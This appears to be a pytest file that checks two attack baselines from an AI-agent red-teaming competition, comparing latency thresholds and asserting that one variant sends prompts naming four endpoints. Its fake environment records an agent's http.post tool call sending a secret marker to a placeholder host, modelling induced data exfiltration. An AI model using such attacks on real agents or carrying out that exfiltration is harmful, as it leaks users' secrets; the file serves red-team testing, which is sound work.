"""Contract tests for the B006 replay-safe threshold8 candidate."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B005_ATTACK_PATH = Path("baselines/replaysafe_tail99_v1/attack.py")
B006_ATTACK_PATH = Path("baselines/replaysafe_threshold8_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float = 9.0) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b006_only_changes_latency_threshold() -> None:
    b005 = _load_attack(B005_ATTACK_PATH, "replaysafe_tail99_attack_for_b006_compare")
    b006 = _load_attack(B006_ATTACK_PATH, "replaysafe_threshold8_attack")

    assert b005.SPLIT_THRESHOLD_S == 12.0
    assert b006.SPLIT_THRESHOLD_S == 8.0
    assert b006.REPLAY_SAFE_FRAC == b005.REPLAY_SAFE_FRAC == 0.99
    assert b006.SLOW_MULTIPOST_N == b005.SLOW_MULTIPOST_N == 4
    assert b006.PROBE_HOPS == b005.PROBE_HOPS == 0
    assert b006.BURST_K == b005.BURST_K == 1


def test_threshold8_routes_medium_latency_to_four_endpoint_frame(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    b005 = _load_attack(B005_ATTACK_PATH, "replaysafe_tail99_attack_medium_latency")
    b006 = _load_attack(B006_ATTACK_PATH, "replaysafe_threshold8_attack_medium_latency")

    b005_clock = FakeClock()
    b006_clock = FakeClock()
    monkeypatch.setattr(b005.time, "monotonic", b005_clock)
    monkeypatch.setattr(b006.time, "monotonic", b006_clock)

    b005_candidates = b005.AttackAlgorithm().run(
        FiringEnv(b005_clock, latency_s=9.0),
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )
    b006_env = FiringEnv(b006_clock, latency_s=9.0)
    b006_candidates = b006.AttackAlgorithm().run(
        b006_env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    b005_messages = [candidate.user_messages[0] for candidate in b005_candidates]
    b006_messages = [candidate.user_messages[0] for candidate in b006_candidates]
    b005_forge = [msg for msg in b005_messages if "these 4 endpoints" in msg]
    b006_forge = [msg for msg in b006_messages if "these 4 endpoints" in msg]

    assert not b005_forge
    assert b006_forge
    assert all(".invalid" in msg for msg in b006_forge)
    assert all(msg.count("http://") == 4 for msg in b006_forge)
    assert set(b006_env.hops) == {8}
